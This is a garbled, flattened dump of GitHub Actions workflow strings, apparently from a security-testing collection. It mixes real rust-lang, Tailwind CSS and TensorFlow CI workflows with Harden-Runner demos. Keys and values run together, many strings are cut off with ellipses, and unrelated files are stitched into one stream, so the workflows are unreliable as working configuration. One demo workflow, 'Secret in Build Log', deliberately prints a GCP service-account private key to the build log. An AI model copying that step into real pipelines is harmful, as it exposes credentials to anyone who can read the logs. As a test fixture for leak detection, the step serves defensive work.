name: e ... requestopen new pull requestopen ne ... requeststeps.edit.outcome != 'success'steps.e ... uccess'gh pr create --title "${PR_TITLE}" --body-file body.md --repo $GITHUB_REPOSITORYgh pr c ... OSITORYname: o ... requestnot-waiting-on-bors:name: B ... go.lock/home/huawei/github-actions-security/.github/workflows/rust-lang_rust__ghcr.ymlGHCR image mirroringmirrorDockerHub mirrorgithub.repository == 'rust-lang/rust'github. ... g/rust'packages: writeLog in to registryecho "${{ secrets.GITHUB_TOKEN }}" | docker login ghcr.io -u ${{ github.repository_owner }} --password-stdinDownload cranecurl -sL "https://github.com/google/go-containerregistry/releases/download/${VERSION}/go-containerregistry_${OS}_${ARCH}.tar.gz" | tar -xzf -
v0.20.2ARCHVERSION: v0.20.2name: Download craneMirror DockerHub# List of DockerHub images to mirror to ghcr.io
images=(
  # Mirrored because used by the mingw-check-tidy, which doesn't cache Docker images
  "ubuntu:22.04"
  # Mirrored because used by all linux CI jobs, including mingw-check-tidy
  "moby/buildkit:buildx-stable-1"
  # Mirrored because used when CI is running inside a Docker container
  "alpine:3.4"
  # Mirrored because used by dist-x86_64-linux
  "centos:7"
)

# Mirror each image from DockerHub to ghcr.io
for img in "${images[@]}"; do
  echo "Mirroring ${img}..."
  # Remove namespace from the image if any.
  # E.g. "moby/buildkit:buildx-stable-1" becomes "buildkit:buildx-stable-1"
  dest_image=$(echo "${img}" | cut -d'/' -f2-)
  ./crane copy \
    "docker.io/${img}" \
    "ghcr.io/${{ github.repository_owner }}/${dest_image}"
done
name: M ... ckerHubname: D ...  mirrormirror:name: G ... rroring/home/huawei/github-actions-security/.github/workflows/rust-lang_rust__post-merge.ymlPost merge analysisPerform analysis and send PRPerform ... send PR# Give GitHub some time to propagate the information that the PR was merged
sleep 60

# Get closest bors merge commit
PARENT_COMMIT=`git rev-list --author='bors <bors@rust-lang.org>' -n1 --first-parent HEAD^1`
echo "Parent: ${PARENT_COMMIT}"

# Find PR for the current commit
HEAD_PR=`gh pr list --search "${{ github.sha }}" --state merged --json number --jq '.[0].number'`
if [ -z "${HEAD_PR}" ]; then
  echo "PR for commit SHA ${{ github.sha }} not found, exiting"
  exit 1
fi
echo "HEAD: ${{ github.sha }} (#${HEAD_PR})"

cd src/ci/citool

printf "<details>\n<summary>What is this?</summary>\n" >> output.log
printf "This is an experimental post-merge analysis report that shows differences in test outcomes between the merged PR and its parent PR.\n" >> output.log
printf "</details>\n\n" >> output.log

cargo run --release post-merge-report ${PARENT_COMMIT} ${{ github.sha }} >> output.log

cat output.log

gh pr comment ${HEAD_PR} -F output.log
name: P ... send PR/home/huawei/github-actions-security/.github/workflows/secret-in-build-log.ymlSecret in Build Logharden-runnername: harden-runnerExtract and use GCP private keyExtract ... ate keyGCP_SERVICE_ACCOUNT_KEYGCP_SER ... UNT_KEY${{ secrets.GCP_SERVICE_ACCOUNT_KEY }}GCP_SER ... _KEY }}# Extracting the private key from the GCP service account key
PRIVATE_KEY=$(echo $GCP_SERVICE_ACCOUNT_KEY | jq -r '.private_key')

# Simulate using the private key
echo "Using the private key for some operation"

# Log the private key (simulating a mistake)
echo "GCP Private Key: $PRIVATE_KEY"
name: E ... ate keyRun a scriptsleep 2
name: Run a scriptname: S ... ild Log/home/huawei/github-actions-security/.github/workflows/self-hosted-file-monitor-with-hr.ymlSelf-Hosted (VM): File Monitoring with Harden-Runner"Self-H ... Runner"ec2[self-hosted, ec2]runs-on ... d, ec2]/home/huawei/github-actions-security/.github/workflows/self-hosted-network-filtering-hr.ymlSelf-Hosted (VM): Network Filtering with Harden-Runner*.docker.io:443 ghcr.io:443 github.com:443 registry.npmjs.org:443
/home/huawei/github-actions-security/.github/workflows/self-hosted-network-monitoring-hr.ymlSelf-Hosted (VM): Network Monitoring with Harden-Runner/home/huawei/github-actions-security/.github/workflows/tailwindlabs_tailwindcss__ci.ymltestsnamespace-profile-defaultnamespa ... default- name: Windowsrun-all${{ github.ref == 'refs/heads/main' || contains(github.event.pull_request.body, '[ci-all]') }}${{ git ... l]') }}- ${{ g ... l]') }}run-all: false- run-all: falsenode-version: [20]${{ matrix.runner.os }}${{ mat ... r.os }}${{ matrix.runner.name }}uses: p ... etup@v4Use Node.js ${{ matrix.node-version }}Use Nod ... sion }}Cache cargo~/.cargo/bin/
~/.cargo/registry/index/
~/.cargo/registry/cache/
~/.cargo/git/db/
target/
${{ runner.os }}-cargo-${{ hashFiles('**/Cargo.lock') }}${{ run ... ck') }}name: Cache cargoCache oxide build./crates/node/*.node
./crates/node/*.wasm
./crates/node/index.d.ts
./crates/node/index.js
./crates/node/browser.js
./crates/node/tailwindcss-oxide.wasi-browser.js
./crates/node/tailwindcss-oxide.wasi.cjs
./crates/node/wasi-worker-browser.mjs
./crates/node/wasi-worker.mjs
${{ runner.os }}-oxide-${{ hashFiles('./crates/**/*') }}${{ run ... /*') }}name: C ... e buildSetup WASM targetrustup target add wasm32-wasip1-threadsrustup  ... threadsname: S ...  targetpnpm run buildCARGO_PROFILE_RELEASE_LTOCARGO_P ... ASE_LTOoff'off'CARGO_TARGET_X86_64_PC_WINDOWS_MSVC_LINKERCARGO_T ... _LINKERlld-link'lld-link'CARGO_P ... : 'off'pnpm run lintmatrix.runner.os == 'ubuntu-latest'pnpm run testInstall Playwright BrowsersInstall ... rowsersnpm run test:uiNotify Discordfailure() && github.ref == 'refs/heads/main'failure ... s/main'discord-actions/message@v2discord ... sage@v2webhookUrlThe [most recent build](<${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}>) on the `main` branch has failed.'The [m ... ailed.'name: Notify Discordtests:/home/huawei/github-actions-security/.github/workflows/tailwindlabs_tailwindcss__integration-tests.ymlIntegration Testsupgradeviteclipostcssoxidewebpack- upgrade${{ matrix.runner.name }} /  ${{ matrix.integration }}${{ mat ... tion }}Test ${{ matrix.integration }}Test ${ ... tion }}pnpm run test:integrations ./integrations/${{ matrix.integration }}pnpm ru ... tion }}GITHUB_WORKSPACEGITHUB_ ... pace }}name: T ... tion }}name: I ... n Tests/home/huawei/github-actions-security/.github/workflows/tailwindlabs_tailwindcss__prepare-release.ymlPrepare Release'v*'- 'v*'APP_NAMEtailwindcss-oxideNODE_VERSIONOXIDE_LOCATION./crates/nodeAPP_NAM ... s-oxidex86_64-pc-windows-msvcx86_64- ... ws-msvcaarch64-pc-windows-msvcaarch64 ... ws-msvcx86_64-apple-darwinstripstrip -xaarch64-apple-darwinpage-sizeaarch64-linux-androidaarch64 ... android${ANDROID_NDK_LATEST_HOME}/toolchains/llvm/prebuilt/linux-x86_64/bin/llvm-strip${ANDRO ... m-striparmv7-linux-androideabiarmv7-l ... oideabix86_64-unknown-linux-gnux86_64- ... nux-gnughcr.io/napi-rs/napi-rs/nodejs-rust:lts-debianghcr.io ... -debianimage:  ... -debianaarch64-unknown-linux-gnuaarch64 ... nux-gnullvm-stripghcr.io/napi-rs/napi-rs/nodejs-rust:lts-debian-aarch64ghcr.io ... aarch64image:  ... aarch64armv7-unknown-linux-gnueabihfarmv7-u ... ueabihfghcr.io/napi-rs/napi-rs/nodejs-rust:lts-debian-zigghcr.io ... ian-zigimage:  ... ian-zigaarch64-unknown-linux-muslaarch64 ... ux-muslaarch64-linux-musl-stripaarch64 ... l-stripdownloadghcr.io/napi-rs/napi-rs/nodejs-rust:lts-alpineghcr.io ... -alpineimage:  ... -alpinex86_64-unknown-linux-muslx86_64- ... ux-muslBuild ${{ matrix.target }} (oxide)Build $ ... (oxide)${{ matrix.container }}${{ mat ... iner }}Use Node.js ${{ env.NODE_VERSION }}Use Nod ... SION }}${{ env.NODE_VERSION }}node-ve ... SION }}name: U ... SION }}Install gcc-arm-linux-gnueabihfInstall ... ueabihf${{ matrix.target == 'armv7-unknown-linux-gnueabihf' }}${{ mat ... ihf' }}sudo apt-get update
sudo apt-get install gcc-arm-linux-gnueabihf g++-arm-linux-gnueabihf -y
name: I ... ueabihf${{ runner.os }}-${{ matrix.target }}-cargo-${{ hashFiles('**/Cargo.lock') }}${{ runner.os }}-${{ matrix.target }}-oxide-${{ hashFiles('./crates/**/*') }}Install Node.JSname: I ... Node.JSInstall Rust (Stable)Install ... Stable)${{ matrix.download }}${{ mat ... load }}rustup default stable
name: I ... Stable)Setup rust targetrustup target add ${{ matrix.target }}rustup  ... rget }}pnpm install --ignore-scripts --filter=!./playgrounds/*pnpm in ... ounds/*pnpm run --filter ${{ env.OXIDE_LOCATION }} build:platform --target=${{ matrix.target }}pnpm ru ... rget }}RUST_TARGET${{ matrix.target }}JEMALLOC_SYS_WITH_LG_PAGEJEMALLO ... LG_PAGE${{ matrix.page-size }}${{ mat ... size }}RUST_TA ... rget }}Strip debug symbols${{ matrix.strip }}${{ matrix.strip }} ${{ env.OXIDE_LOCATION }}/*.node${{ mat ... /*.nodename: S ... s/46034bindings-${{ matrix.target }}binding ... rget }}${{ env.OXIDE_LOCATION }}/*.node${{ env ... /*.nodename: b ... rget }}build-freebsdBuild x86_64-unknown-freebsd (OXIDE)Build x ... (OXIDE)Build FreeBSDcross-platform-actions/action@v0.25.0cross-p ... v0.25.0napi:*RUSTUP_HOME/usr/local/rustupCARGO_HOME/usr/local/cargoRUSTUP_IO_THREADSx86_64-unknown-freebsdx86_64- ... freebsdDEBUG: napi:*operating_system14.0'14.0'memory13Gcpu_countenvironment_variablesenviron ... riablesDEBUG RUSTUP_IO_THREADS'DEBUG  ... HREADS'sudo pkg install -y -f curl node libnghttp2 npm
sudo npm install -g pnpm@9.6.0 --unsafe-perm=true
curl -sSf https://static.rust-lang.org/rustup/archive/1.27.1/x86_64-unknown-freebsd/rustup-init --output rustup-init
chmod +x rustup-init
./rustup-init -y --profile minimal
source "$HOME/.cargo/env"
pnpm install --ignore-scripts --filter=!./playgrounds/* || true
echo "~~~~ rustc --version ~~~~"
rustc --version
echo "~~~~ node -v ~~~~"
node -v
echo "~~~~ pnpm --version ~~~~"
pnpm --version
pnpm run --filter ${{ env.OXIDE_LOCATION }} build:platform
strip -x ${{ env.OXIDE_LOCATION }}/*.node
ls -la ${{ env.OXIDE_LOCATION }}
operati ... freebsdname: Build FreeBSDbindings-x86_64-unknown-freebsdbinding ... freebsdname: b ... freebsdname: B ... (OXIDE)Build and release Tailwind CSSBuild a ... ind CSSfetch-depth: 20git fetch --tags -frun: gi ... tags -fResolve versionvarsecho "TAG_NAME=$(git describe --tags --abbrev=0)" >> $GITHUB_ENV
pnpm --filter=!./playgrounds/* installpnpm -- ... installDownload artifacts${{ env.OXIDE_LOCATION }}${{ env ... TION }}path: $ ... TION }}Move artifactscd ${{ env.OXIDE_LOCATION }}
cp bindings-x86_64-pc-windows-msvc/* ./npm/win32-x64-msvc/
cp bindings-aarch64-pc-windows-msvc/* ./npm/win32-arm64-msvc/
cp bindings-x86_64-apple-darwin/* ./npm/darwin-x64/
cp bindings-aarch64-apple-darwin/* ./npm/darwin-arm64/
cp bindings-aarch64-linux-android/* ./npm/android-arm64/
cp bindings-armv7-linux-androideabi/* ./npm/android-arm-eabi/
cp bindings-aarch64-unknown-linux-gnu/* ./npm/linux-arm64-gnu/
cp bindings-aarch64-unknown-linux-musl/* ./npm/linux-arm64-musl/
cp bindings-armv7-unknown-linux-gnueabihf/* ./npm/linux-arm-gnueabihf/
cp bindings-x86_64-unknown-linux-gnu/* ./npm/linux-x64-gnu/
cp bindings-x86_64-unknown-linux-musl/* ./npm/linux-x64-musl/
cp bindings-x86_64-unknown-freebsd/* ./npm/freebsd-x64/
name: Move artifactsBuild Tailwind CSSFEATURES_ENVFEATURES_ENV: stablename: B ... ind CSSRun pre-publish optimizations scriptsRun pre ... scriptsnode ./scripts/pre-publish-optimizations.mjsnode ./ ... ons.mjsLock pre-release versionsLock pr ... ersionsnode ./scripts/lock-pre-release-versions.mjsname: L ... ersionsGet release notesRELEASE_NOTES=$(node ./scripts/release-notes.mjs)
echo "RELEASE_NOTES<<EOF" >> $GITHUB_ENV
echo "$RELEASE_NOTES" >> $GITHUB_ENV
echo "EOF" >> $GITHUB_ENV
Upload standalone artifactstailwindcss-standalonetailwin ... ndalonepackages/@tailwindcss-standalone/dist/package ... e/dist/name: t ... ndaloneUpload npm package tarballsUpload  ... arballsnpm-package-tarballsdist/*.tgzname: n ... arballsname: U ... arballsPrepare GitHub ReleasePrepare ... Release${{ env.RELEASE_NOTES }}
packages/@tailwindcss-standalone/dist/sha256sums.txt
packages/@tailwindcss-standalone/dist/tailwindcss-linux-arm64
packages/@tailwindcss-standalone/dist/tailwindcss-linux-arm64-musl
packages/@tailwindcss-standalone/dist/tailwindcss-linux-x64
packages/@tailwindcss-standalone/dist/tailwindcss-linux-x64-musl
packages/@tailwindcss-standalone/dist/tailwindcss-macos-arm64
packages/@tailwindcss-standalone/dist/tailwindcss-macos-x64
packages/@tailwindcss-standalone/dist/tailwindcss-windows-x64.exe
runs-on: macos-14/home/huawei/github-actions-security/.github/workflows/tailwindlabs_tailwindcss__release-insiders.ymlRelease Insidersinsiderssudo pkg install -y -f curl node libnghttp2 npm
sudo npm install -g pnpm@9.6.0 --unsafe-perm=true
curl -sSf https://static.rust-lang.org/rustup/archive/1.27.1/x86_64-unknown-freebsd/rustup-init --output rustup-init
chmod +x rustup-init
./rustup-init -y --profile minimal
source "$HOME/.cargo/env"
echo "~~~~ rustc --version ~~~~"
rustc --version
echo "~~~~ node -v ~~~~"
node -v
echo "~~~~ pnpm --version ~~~~"
pnpm --version
pnpm install --ignore-scripts --filter=!./playgrounds/* || true
pnpm run --filter ${{ env.OXIDE_LOCATION }} build:platform
strip -x ${{ env.OXIDE_LOCATION }}/*.node
ls -la ${{ env.OXIDE_LOCATION }}
Build and release Tailwind CSS insidersBuild a ... nsidersecho "SHA_SHORT=$(git rev-parse --short HEAD)" >> $GITHUB_ENV
Version based on commit: 0.0.0-${{ env.RELEASE_CHANNEL }}.${{ env.SHA_SHORT }}'Versio ... ORT }}'pnpm run version-packages 0.0.0-${{ env.RELEASE_CHANNEL }}.${{ env.SHA_SHORT }}pnpm ru ... HORT }}name: ' ... ORT }}'pnpm --recursive --filter="!@tailwindcss/oxide-wasm32-wasi" publish --tag ${{ env.RELEASE_CHANNEL }} --no-git-checks
# The wasm package needs a special npm config that isn't read when pnpm --recursive is used
pushd crates/node/npm/wasm32-wasi; pnpm publish --tag ${{ env.RELEASE_CHANNEL }} --no-git-checks; popd;
Trigger Tailwind Play updateTrigger ...  update${{ secrets.TAILWIND_PLAY_TOKEN }}await github.rest.actions.createWorkflowDispatch({
  owner: 'tailwindlabs',
  repo: 'upgrades',
  ref: 'main',
  workflow_id: 'upgrade-tailwindcss.yml'
})
name: T ...  updatename: R ... nsiders/home/huawei/github-actions-security/.github/workflows/tailwindlabs_tailwindcss__release.ymlCalculate environment variablesCalcula ... riablesecho "RELEASE_CHANNEL=$(node ./scripts/release-channel.js)" >> $GITHUB_ENV
echo "TAILWINDCSS_VERSION=$(node -e 'console.log(require(`./packages/tailwindcss/package.json`).version);')" >> $GITHUB_ENV
name: C ... riablesenv.RELEASE_CHANNEL == 'latest'env.REL ... latest'/home/huawei/github-actions-security/.github/workflows/tensorflow_tensorflow__arm-cd.ymlARM CDv2.**- v2.**r2.**- r2.**github.repository == 'tensorflow/tensorflow'github. ... orflow'ARM64[self-h ...  ARM64]pyver['3.9', ... '3.12']pyver:  ... '3.12']Stop old running containers (if any)Stop ol ... if any)running_containers=$(docker ps -q) && \
if [[ $running_containers == "" ]]; then
  echo "No running containers";
else
  echo "Running container(s) found" && \
  docker stop $running_containers;
fi
docker container prune -f
name: S ... if any)Clean repositoryfind /home/ubuntu/actions-runner/_work/tensorflow/tensorflow/. -name . -o -prune -exec sudo rm -rf -- {} + || truefind /h ... || trueCheckout repository for nightly (skipped for releases)Checkou ... leases)'nightly'ref: 'nightly'name: C ... leases)Checkout repository for releases (skipped for nightly)Checkou ... ightly)name: C ... ightly)Build and test pip wheelBuild a ... p wheelis_nightly=0 && tf_project_name='tensorflow_cpu_aws' && ${{ github.event_name == 'schedule' }} && is_nightly=1 && tf_project_name='tf_nightly_cpu_aws'
echo "PyPI project name:" $tf_project_name
CI_DOCKER_BUILD_EXTRA_PARAMS="--build-arg py_major_minor_version=${{ matrix.pyver }} --build-arg is_nightly=${is_nightly} --build-arg tf_project_name=${tf_project_name}" \
./tensorflow/tools/ci_build/ci_build.sh cpu.arm64 bash tensorflow/tools/ci_build/rel/ubuntu/cpu_arm64_test_build.sh
name: B ... p wheelUpload pip wheel to PyPIUpload  ... to PyPIgithub.event_name == 'schedule' || (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v2'))github. ... s/v2'))python3 -m twine upload --verbose /home/ubuntu/actions-runner/_work/tensorflow/tensorflow/whl/* -u "__token__" -p ${{ secrets.AWS_PYPI_ACCOUNT_TOKEN }}python3 ... OKEN }}name: U ... to PyPI- name: ... if any)if: git ... n forksname: ARM CD/home/huawei/github-actions-security/.github/workflows/tensorflow_tensorflow__arm-ci-extended-cpp.ymlARM CI Extended C++0 2 * * *'0 2 * * *'cron: '0 2 * * *'- cron: '0 2 * * *'['3.10']pyver: ['3.10']running_containers=$(docker ps -q) && \
if [[ $running_containers == "" ]]; then
  echo "No running containers";
else
  echo "Running container(s) found" && \
  docker stop $running_containers;
fi
docker container prune -f
docker image prune -af
Build binary and run C++ testsBuild b ... + testsis_nightly=0 && tf_project_name='tf_ci_ext_c' && ${{ github.event_name == 'schedule' }} && is_nightly=1 && tf_project_name='tf_nightly_ci_ext_c'
CI_DOCKER_BUILD_EXTRA_PARAMS="--build-arg py_major_minor_version=${{ matrix.pyver }} --build-arg is_nightly=${is_nightly} --build-arg tf_project_name=${tf_project_name}" \
./tensorflow/tools/ci_build/ci_build.sh cpu.arm64 bash tensorflow/tools/ci_build/rel/ubuntu/cpu_arm64_test_cpp.sh
name: B ... + testsname: A ... ded C++/home/huawei/github-actions-security/.github/workflows/tensorflow_tensorflow__arm-ci-extended.ymlARM CI Extended0 4 * * *'0 4 * * *'cron: '0 4 * * *'- cron: '0 4 * * *'Build binary and run python tests on nightly for all python versionsBuild b ... ersionsis_nightly=0 && tf_project_name='tf_ci_ext' && ${{ github.event_name == 'schedule' }} && is_nightly=1 && tf_project_name='tf_nightly_ci_ext'
CI_DOCKER_BUILD_EXTRA_PARAMS="--build-arg py_major_minor_version=${{ matrix.pyver }} --build-arg is_nightly=${is_nightly} --build-arg tf_project_name=${tf_project_name}" \
./tensorflow/tools/ci_build/ci_build.sh cpu.arm64 bash tensorflow/tools/ci_build/rel/ubuntu/cpu_arm64_test.sh
name: B ... ersionsname: A ... xtended/home/huawei/github-actions-security/.github/workflows/tensorflow_tensorflow__arm-ci.ymlARM CIgithub.repository == 'tensorflow/tensorflow' && (github.event.action != 'labeled' || (github.event.action == 'labeled' && github.event.label.name == 'kokoro:force-run'))github. ... -run'))Build binary and run python testsBuild b ... n testsCI_DOCKER_BUILD_EXTRA_PARAMS="--pull --build-arg py_major_minor_version=${{ matrix.pyver }} --build-arg is_nightly=1 --build-arg tf_project_name=tf_nightly_ci" \
./tensorflow/tools/ci_build/ci_build.sh cpu.arm64 bash tensorflow/tools/ci_build/rel/ubuntu/cpu_arm64_test.sh
name: B ... n testsif: git ... -run'))name: ARM CI/home/huawei/github-actions-security/.github/workflows/tensorflow_tensorflow__cffconvert.ymlcffconvertCITATION.cff- CITATION.cff"validate"Check out a copy of the repositoryCheck whether the citation metadata from CITATION.cff is validCheck w ... s validcitation-file-format/cffconvert-github-action@4cf11baa70a673bfdf9dad0acc7ee33b3f4b6084citatio ... f4b6084--validate"--validate"args: "--validate"name: C ... s validvalidate:name: cffconvert/home/huawei/github-actions-security/.github/workflows/tensorflow_tensorflow__issue-on-pr-rollback.ymlCreates a GitHub Issue when a PR Rolled back via Commit to MasterCreates ...  Mastercreate-issue-on-pr-rollbackcreate- ... ollbackgithub.repository == 'tensorflow/tensorflow' &&
startsWith(github.event.head_commit.message, 'Rollback of PR #')
Create a new Github IssueCreate  ... b Issueconst script = require('./.github/workflows/create_issue.js')
console.log(await script({github, context}))
name: C ... b Issuecreate- ... llback:name: C ...  Master/home/huawei/github-actions-security/.github/workflows/tensorflow_tensorflow__osv-scanner-scheduled.ymlOSV-Scanner Scheduled ScanOSV-Sca ... ed Scancron: 0 4 * * 1- cron: 0 4 * * 1scan-scheduledgoogle/osv-scanner-action/.github/workflows/osv-scanner-reusable.yml@v2.0.1"google ... v2.0.1"scan-args--lockfile=requirements.txt:./requirements_lock_3_9.txt
--lockfile=requirements.txt:./requirements_lock_3_10.txt
--lockfile=requirements.txt:./requirements_lock_3_11.txt
--lockfile=requirements.txt:./requirements_lock_3_12.txt
--lockfile=requirements.txt:./ci/official/containers/linux_arm64/devel.requirements.txt
--lockfile=requirements.txt:./ci/official/containers/linux_arm64/jax.requirements.txt
--lockfile=requirements.txt:./ci/official/containers/linux_arm64/devel.usertools/test.requirements.txtscan-args: |-if: git ... orflow'scan-scheduled:name: O ... ed Scan/home/huawei/github-actions-security/.github/workflows/tensorflow_tensorflow__pylint-presubmit.ymlPyLint**.py'**.py'- '**.py'get_file_changes ' 'output: ' 'Report list of changed filesReport  ... d filesecho Changed files: ${{ steps.get_file_changes.outputs.files }}
name: R ... d filesSet up Python 3.9python- ... : "3.9"Install Python dependenciespython -m pip install --upgrade pip
pip install pylint==2.13.9 numpy wheel
Run PyLint on changed filesRun PyL ... d filesecho "${{ steps.get_file_changes.outputs.files}}" | tr " " "\n" | grep ".py$" | xargs pylint --rcfile=tensorflow/tools/ci_build/pylintrc
name: PyLint/home/huawei/github-actions-security/.github/workflows/tensorflow_tensorflow__release-branch-cherrypick.ymlRelease Branch CherrypickRelease ... rrypickrelease_branchRelease branch name (e.g. r2.9)'Releas ...  r2.9)'descrip ...  r2.9)'git_commitGit commit to cherry-pick'Git co ... y-pick'descrip ... y-pick'release_branch:cherrypickCherrypick to ${{ github.event.inputs.release_branch}} - ${{ github.event.inputs.git_commit }}Cherryp ... mmit }}${{ github.event.inputs.release_branch }}Get some helpful info for formattingGet som ... mattinggit config --global user.name "TensorFlow Release Automation"
git config --global user.email "jenkins@tensorflow.org"
git fetch origin master
git cherry-pick ${{ github.event.inputs.git_commit }}
echo "SHORTSHA=$(git log -1 ${{ github.event.inputs.git_commit }} --format="%h")" >> "$GITHUB_OUTPUT"
echo "TITLE=$(git log -1 ${{ github.event.inputs.git_commit }} --format="%s")" >> "$GITHUB_OUTPUT"
name: G ... mattingCreate Pull Request with changesCreate  ... changespeter-evans/create-pull-request@271a8d0340265f705b14b6d32b9829c1cb33d45epeter-e ... b33d45e${{ github.event.inputs.release_branch }} cherry-pick: ${{ steps.cherrypick.outputs.SHORTSHA }} "${{ steps.cherrypick.outputs.TITLE }}"'${{ gi ... LE }}"'committerTensorFlow Release Automation <jenkins@tensorflow.org>TensorF ... ow.org>${{ secrets.JENKINS_TOKEN }}${{ github.event.inputs.release_branch }}-${{ steps.cherrypick.outputs.SHORTSHA }}${{ git ... TSHA }}learning-to-playRefer to the original commit: https://github.com/tensorflow/tensorflow/commit/${{ github.event.inputs.git_commit }}
title:  ... LE }}"'name: C ... mmit }}cherrypick:name: R ... rrypick/home/huawei/github-actions-security/.github/workflows/tensorflow_tensorflow__scorecards-analysis.yml26 3 * * 2'26 3 * * 2'cron: '26 3 * * 2'- cron: '26 3 * * 2'github/codeql-action/upload-sarif@28deaeda66b76a05916b6923827895f2b14ab387github/ ... 14ab387/home/huawei/github-actions-security/.github/workflows/tensorflow_tensorflow__stale-issues.yml"30 1 * * *"cron: "30 1 * * *"- cron: "30 1 * * *"Awaiting response issuesAwaitin ...  issuesoverride-stale'override-stale'"override-stale"labels-to-remove-when-unstalelabels- ... unstalestat:awaiting response'stat:a ... sponse'"stat:a ... sponse"This issue is stale because it has been open for 7 days with no activity. It will be closed if no further activity occurs. Thank you.
> This issue was closed because it has been inactive for 7 days since being marked as stale. Please reopen if you'd like to work on this further.
This PR is stale because it has been open for 14 days with no activity. It will be closed if no further activity occurs. Thank you."This P ... k you."This PR was closed because it has been inactive for 14 days since being marked as stale. Please reopen if you'd like to work on this further."This P ... rther."exempt- ... -stale'name: A ...  issuesContribution issues180stat:contribution welcome,stat:good first issue"stat:c ...  issue"any-of-labelsThis issue is stale because it has been open for 180 days with no activity. It will be closed if no further activity occurs. Thank you.
This issue was closed because it has been inactive for 1 year.
/home/huawei/github-actions-security/.github/workflows/tensorflow_tensorflow__update-nightly.ymlcron: 0 ... 8pm PST- cron: ... 8pm PSTworkflo ... riggersSet nightly branch to master HEADSet nig ... er HEADmaster-to-nightlyzofrex/mirror-branch@0be56f4c8077a288a635a491b306ba0bb1c810e6zofrex/ ... 1c810e6target- ... ightly'uses: z ...  v1.0.4- uses: ...  v1.0.4master-to-nightly:/home/huawei/github-actions-security/.github/workflows/tensorflow_tensorflow__update-rbe.ymlUpdate RBE ConfigsrbeUpdate the RBE ConfigsUpdate  ... Configsfunction map() {
  # The "digest" that allows us to pull an image is not the digest as
  # returned by the API, but a sha256sum of the entire chunk of image
  # metadata. gcr.io helpfully includes it in the header of the response
  # as docker-content-digest: sha256:[digest]. Note we use egrep to
  # match exactly sha256:<hash> because curl may include a ^M symbol at
  # the end of the line.
  # See https://cloud.google.com/architecture/using-container-images#exploring_image_manifests_digests_and_tags
  echo -n "Trying to map name $1 to tag $2... "
  digest=$(curl -s --head "https://gcr.io/v2/tensorflow-sigs/build/manifests/$2" | egrep -o "sha256:[[:alnum:]]*")
  # Find the line matching the regex "sigbuild-r2.9" (with quotes) and
  # replace just the digest portion in it
  sed -i"" "/\"$1\"/ s/sha256:[[:alnum:]]*/$digest/g" tensorflow/tools/toolchains/remote_config/configs.bzl
  echo "success."
}
# See https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/toolchains/remote_config/configs.bzl
# This is a mapping of name_container_map keys under sigbuild_tf_configs
# to tag names on gcr.io/tensorflow-sigs/build.
# TF 2.9
map sigbuild-r2.9 2.9-python3.9
map sigbuild-r2.9-python3.8 2.9-python3.8
map sigbuild-r2.9-python3.9 2.9-python3.9
map sigbuild-r2.9-python3.10 2.9-python3.10
# TF 2.10
map sigbuild-r2.10 2.10-python3.9
map sigbuild-r2.10-python3.8 2.10-python3.8
map sigbuild-r2.10-python3.9 2.10-python3.9
map sigbuild-r2.10-python3.10 2.10-python3.10
# TF 2.11
map sigbuild-r2.11 2.11-python3.9
map sigbuild-r2.11-python3.8 2.11-python3.8
map sigbuild-r2.11-python3.9 2.11-python3.9
map sigbuild-r2.11-python3.10 2.11-python3.10
# WIP Clang Containers, used by TVCs
map sigbuild-57469 57469-python3.9
map sigbuild-57469-python3.8 57469-python3.8
map sigbuild-57469-python3.9 57469-python3.9
map sigbuild-57469-python3.10 57469-python3.10
# TF 2.12
map sigbuild-r2.12 2.12-python3.9
map sigbuild-r2.12-python3.8 2.12-python3.8
map sigbuild-r2.12-python3.9 2.12-python3.9
map sigbuild-r2.12-python3.10 2.12-python3.10
map sigbuild-r2.12-python3.11 2.12-python3.11
# TF 2.12 + Clang (containers are the same, but env vars in configs.bzl are different)
map sigbuild-r2.12-clang 2.12-python3.9
map sigbuild-r2.12-clang-python3.8 2.12-python3.8
map sigbuild-r2.12-clang-python3.9 2.12-python3.9
map sigbuild-r2.12-clang-python3.10 2.12-python3.10
map sigbuild-r2.12-clang-python3.11 2.12-python3.11
# TF 2.13
map sigbuild-r2.13 2.13-python3.9
map sigbuild-r2.13-python3.8 2.13-python3.8
map sigbuild-r2.13-python3.9 2.13-python3.9
map sigbuild-r2.13-python3.10 2.13-python3.10
map sigbuild-r2.13-python3.11 2.13-python3.11
# TF 2.13 + Clang (containers are the same, but env vars in configs.bzl are different)
map sigbuild-r2.13-clang 2.13-python3.9
map sigbuild-r2.13-clang-python3.8 2.13-python3.8
map sigbuild-r2.13-clang-python3.9 2.13-python3.9
map sigbuild-r2.13-clang-python3.10 2.13-python3.10
map sigbuild-r2.13-clang-python3.11 2.13-python3.11
# TF 2.14
map sigbuild-r2.14 2.14-python3.9
map sigbuild-r2.14-python3.9 2.14-python3.9
map sigbuild-r2.14-python3.10 2.14-python3.10
map sigbuild-r2.14-python3.11 2.14-python3.11
# TF 2.14 + Clang (containers are the same, but env vars in configs.bzl are different)
map sigbuild-r2.14-clang 2.14-python3.9
map sigbuild-r2.14-clang-python3.9 2.14-python3.9
map sigbuild-r2.14-clang-python3.10 2.14-python3.10
map sigbuild-r2.14-clang-python3.11 2.14-python3.11
# TF 2.16
map sigbuild-r2.16 2.16-python3.11
map sigbuild-r2.16-python3.9 2.16-python3.9
map sigbuild-r2.16-python3.10 2.16-python3.10
map sigbuild-r2.16-python3.11 2.16-python3.11
map sigbuild-r2.16-python3.12 2.16-python3.12
# TF 2.16 + Clang (containers are the same, but env vars in configs.bzl are different)
map sigbuild-r2.16-clang 2.16-python3.11
map sigbuild-r2.16-clang-python3.9 2.16-python3.9
map sigbuild-r2.16-clang-python3.10 2.16-python3.10
map sigbuild-r2.16-clang-python3.11 2.16-python3.11
map sigbuild-r2.16-clang-python3.12 2.16-python3.12
# TF 2.17
map sigbuild-r2.17 2.17-python3.11
map sigbuild-r2.17-python3.9 2.17-python3.9
map sigbuild-r2.17-python3.10 2.17-python3.10
map sigbuild-r2.17-python3.11 2.17-python3.11
map sigbuild-r2.17-python3.12 2.17-python3.12
# TF 2.17 + Clang (containers are the same, but env vars in configs.bzl are different)
map sigbuild-r2.17-clang 2.17-python3.11
map sigbuild-r2.17-clang-python3.9 2.17-python3.9
map sigbuild-r2.17-clang-python3.10 2.17-python3.10
map sigbuild-r2.17-clang-python3.11 2.17-python3.11
map sigbuild-r2.17-clang-python3.12 2.17-python3.12
